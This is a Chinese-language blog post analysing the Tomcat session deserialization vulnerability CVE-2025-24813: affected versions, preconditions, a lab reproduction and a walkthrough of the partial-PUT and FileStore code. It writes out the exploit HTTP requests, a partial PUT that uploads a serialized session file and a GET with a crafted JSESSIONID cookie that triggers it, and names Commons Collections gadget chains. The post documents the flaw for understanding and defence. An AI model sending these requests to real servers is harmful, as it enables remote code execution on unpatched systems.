---
layout: post
title: "Tomcat-Session-反序列化漏洞CVE-2025-24813"
date: 2025-03-14 20:30:23 +0800
description: "核心逻辑在这里，以 range.length作为文件的长度，range.start作为起始点开始处理流，这也是为什么 length 必须要大于 body 的总长度，不然无法将内容完全上传。这部分是反序列化触发点，CVE-2020-9484出自这里，所以不难看出这其实是一个组合漏洞，当时CVE-2020-9484是因为存在目录穿越问题所以可以穿越加载一个自定义的序列化文件。CVE-2017-12615、CVE-2024-50379均涉及该方法，也就是 doPUT，其实逻辑很简单，如以下代码。"
keywords: "Tomcat Session 反序列化漏洞（CVE-2025-24813）"
categories: ['未分类']
tags: ['安全']
artid: "146266657"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146266657
    alt: "Tomcat-Session-反序列化漏洞CVE-2025-24813"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146266657
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146266657
cover: https://bing.ee123.net/img/rand?artid=146266657
image: https://bing.ee123.net/img/rand?artid=146266657
img: https://bing.ee123.net/img/rand?artid=146266657
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Tomcat Session 反序列化漏洞（CVE-2025-24813）
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2 style="margin-left:0; margin-right:0">
     <span style="color:black">
      <strong>
       <span style="color:black">
        1.
       </span>
       <span style="color:black">
        漏洞描述
       </span>
      </strong>
     </span>
    </h2>
    <p style="margin-left:0; margin-right:0">
     <a name="I0ktN">
      <span style="color:#0d0016">
       Tomcat
      </span>
     </a>
     是一个开源的、轻量级的 Web 应用服务器 和 Servlet 容器。它由 Apache 软件基金会下的 Jakarta 项目开发，是目前最流行的 Java Web 服务器之一。
    </p>
    <p style="margin-left:0; margin-right:0">
     该漏洞利用条件较为复杂，需同时满足以下四个条件：
    </p>
    <p style="margin-left:0; margin-right:0">
     应用程序启用了DefaultServlet写入功能，该功能默认关闭
    </p>
    <p style="margin-left:0; margin-right:0">
     应用支持了 partial PUT 请求，能够将恶意的序列化数据写入到会话文件中，该功能默认开启
    </p>
    <p style="margin-left:0; margin-right:0">
     应用使用了 Tomcat 的文件会话持久化并且使用了默认的会话存储位置，需要额外配置
    </p>
    <p style="margin-left:0; margin-right:0">
     应用中包含一个存在反序列化漏洞的库，比如存在于类路径下的 commons-collections，此条件取决于业务实现是否依赖存在反序列化利用链的库
    </p>
    <h2 style="margin-left:0; margin-right:0">
     <span style="color:black">
      <strong>
       <span style="color:black">
        2.
       </span>
       <span style="color:black">
        影响版本
       </span>
      </strong>
     </span>
    </h2>
    <p style="margin-left:0; margin-right:0">
    </p>
    <pre><code class="hljs">9.0.0.M1 &lt;= tomcat &lt;= 9.0.98
10.1.0-M1 &lt;= tomcat &lt;= 10.1.34
11.0.0-M1 &lt;= tomcat &lt;= 11.0.2</code></pre>
    <h2 style="margin-left:0px; margin-right:0px">
     <strong>
      <span style="color:black">
       3.
      </span>
      <span style="color:black">
       漏洞复现
      </span>
     </strong>
    </h2>
    <p style="margin-left:0; margin-right:0">
     <span style="background-color:white">
      <span style="color:#1f2328">
       在
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       conf/web.xml
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       中，将
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       DefaultServlet
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       的
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       readonly
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       配置为
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       false
      </span>
     </span>
     <span style="background-color:white">
      <span style="color:#1f2328">
       ，启用写入功能
      </span>
     </span>
    </p>
    <p style="margin-left:0; margin-right:0">
     <img alt="" height="414" src="https://i-blog.csdnimg.cn/direct/90c3d0b8d7d14abdb455f7eb68ddb872.png" width="902"/>
    </p>
    <p style="margin-left:0; margin-right:0">
     <strong>
      conf/context.xml
     </strong>
    </p>
    <p style="margin-left:0; margin-right:0">
     在conf/context.xml中，添加如下配置，开启File文件会话存储
    </p>
    <pre><code class="hljs">    &lt;Manager className="org.apache.catalina.session.PersistentManager"&gt; 

      &lt;Store className="org.apache.catalina.session.FileStore"/&gt; 

    &lt;/Manager&gt;  </code></pre>
    <p>
    </p>
    <p style="margin-left:0; margin-right:0">
     <img alt="" height="210" src="https://i-blog.csdnimg.cn/direct/4208cac677544d30b82bd3061b536d80.png" width="903"/>
    </p>
    <p>
    </p>
    <p style="margin-left:0; margin-right:0">
     将Commons Collections 3.2.1.jar放入lib文件夹
     <img alt="" height="686" src="https://i-blog.csdnimg.cn/direct/3da2df27d4ef40dea84f1bb4119fd685.png" width="903"/>
    </p>
    <p style="margin-left:0; margin-right:0">
     commons-collections:commons-collections:3.2.1 可以使用CommonsCollectionsK1 ,CommonsCollectionsK3 等链来打
    </p>
    <p>
    </p>
    <pre><code class="hljs">PUT /000/session HTTP/1.1

Host: 192.168.100.1:8080

Content-Length: 1000 

Content-Range: bytes 0-1000/1200 


{<!-- -->{反序列化文件内容)}}</code></pre>
    <p>
    </p>
    <p style="margin-left:0; margin-right:0">
     <img alt="" height="520" src="https://i-blog.csdnimg.cn/direct/8b843211183b4bf0814b5ef1445b81c0.png" width="902"/>
    </p>
    <p style="margin-left:0; margin-right:0">
     该文件会在tomcat中\work\Catalina\localhost\ROOT目录生成
    </p>
    <p style="margin-left:0; margin-right:0">
     <img alt="" height="345" src="https://i-blog.csdnimg.cn/direct/2349779494514d1b811aa752167a2cba.png" width="904"/>
    </p>
    <pre><code class="hljs">GET / HTTP/1.1 

Host: 192.168.10.218:8080

Cookie: JSESSIONID=.000</code></pre>
    <p>
    </p>
    <p style="margin-left:0; margin-right:0">
     <img alt="" height="522" src="https://i-blog.csdnimg.cn/direct/6ce7d655b7c046a7bc6b34e28e2afe31.png" width="903"/>
    </p>
    <p>
    </p>
    <p style="margin-left:0; margin-right:0">
    </p>
    <p style="margin-left:0; margin-right:0">
    </p>
    <p style="margin-left:0; margin-right:0">
    </p>
    <h2 style="margin-left:0px; margin-right:0px">
     <strong>
      <span style="color:black">
       4.
      </span>
      <span style="color:black">
       漏洞分析
      </span>
     </strong>
    </h2>
    <p style="margin-left:0cm; margin-right:0cm">
     自带的一个 Servelet 会处理一些默认类型的请求，如 PUT、POST、GET。
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     CVE-2017-12615、CVE-2024-50379均涉及该方法，也就是 doPUT，其实逻辑很简单，如以下代码。
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="627" src="https://i-blog.csdnimg.cn/direct/d59d6d5287ae41b0af58f93c0d0e0645.png" width="902"/>
    </p>
    <pre><code class="hljs">WebResource oldResource = this.resources.getResource(path)</code></pre>
    <p style="margin-left:0cm; margin-right:0cm">
     这里直接获取 Web 根目录了，然后将文件上传，这也是最开始的 PUT 文件上传漏洞点。而今天的漏洞点出自上述的 else 分支。
    </p>
    <pre><code class="hljs">executePartialPut</code></pre>
    <p style="margin-left:0cm; margin-right:0cm">
     Tomcat 在处理不完整的 PUT 请求有单独的逻辑。这个和请求头 Content-Range 有关
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="429" src="https://i-blog.csdnimg.cn/direct/9d1bd8c8ade043959679a6181a7b064e.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="687" src="https://i-blog.csdnimg.cn/direct/88397b61fcbf4aeb99a9a65788fb625d.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     其实你可以理解为和分块差不多一个意思。
    </p>
    <pre><code class="hljs">PUT /CVE_2025_24813_war_exploded/a/session HTTP/1.1
Host: 192.168.10.218:8080
Content-Length: 1000
Content-Range: bytes 0-1000/1200 

testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest</code></pre>
    <p style="margin-left:0cm; margin-right:0cm">
     利用该方法上传一个session 文件，看看过程
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="720" src="https://i-blog.csdnimg.cn/direct/62b252ede23d435b8f1a8673db0847c1.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     start、end、length和请求头对应，随后会进入 executePartialPut 内。
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="587" src="https://i-blog.csdnimg.cn/direct/eac4308552a641deb489b57990410ee4.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     在这里会将斜杠替换为.,因此我们可以上传一个 xxx.session 文件。具体处理逻辑在底部
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     核心逻辑在这里，以 range.length作为文件的长度，range.start作为起始点开始处理流，这也是为什么 length 必须要大于 body 的总长度，不然无法将内容完全上传。
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="362" src="https://i-blog.csdnimg.cn/direct/ebabcc8b5feb42c2b9fb6ee81731e791.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     状态码409 错误，实际上已经上传了
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="361" src="https://i-blog.csdnimg.cn/direct/0d523d9cbba74b119ffa25fb4b83885a.png" width="902"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <strong>
      FileStore#load
     </strong>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     这部分是反序列化触发点，CVE-2020-9484出自这里，所以不难看出这其实是一个组合漏洞，当时CVE-2020-9484是因为存在目录穿越问题所以可以穿越加载一个自定义的序列化文件。
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="931" src="https://i-blog.csdnimg.cn/direct/19fb2b30f9794168b091f0f59a554c09.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     this.file(id); 内容如下
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="282" src="https://i-blog.csdnimg.cn/direct/9174cc2cfc084631ba8247c91435370b.png" width="903"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     修复方式就是getCanonicalFile处理穿越问题。因此无法目录穿越了，只能加载缓存目录下的.session后缀文件并且将其反序列化。反序列化的触发点是没删除的。
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="581" src="https://i-blog.csdnimg.cn/direct/6b47be3af45144f7b7c36f6db57e3edd.png" width="902"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
     <img alt="" height="518" src="https://i-blog.csdnimg.cn/direct/20c2ebeb4b164cccad1b0ed7c6266f6e.png" width="902"/>
    </p>
    <p style="margin-left:0cm; margin-right:0cm">
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e6373:646e2e6e65742f7875616e64616f5f616866656e6772656e2f:61727469636c652f64657461696c732f313436323636363537" class_="artid" style="display:none">
 </p>
</div>


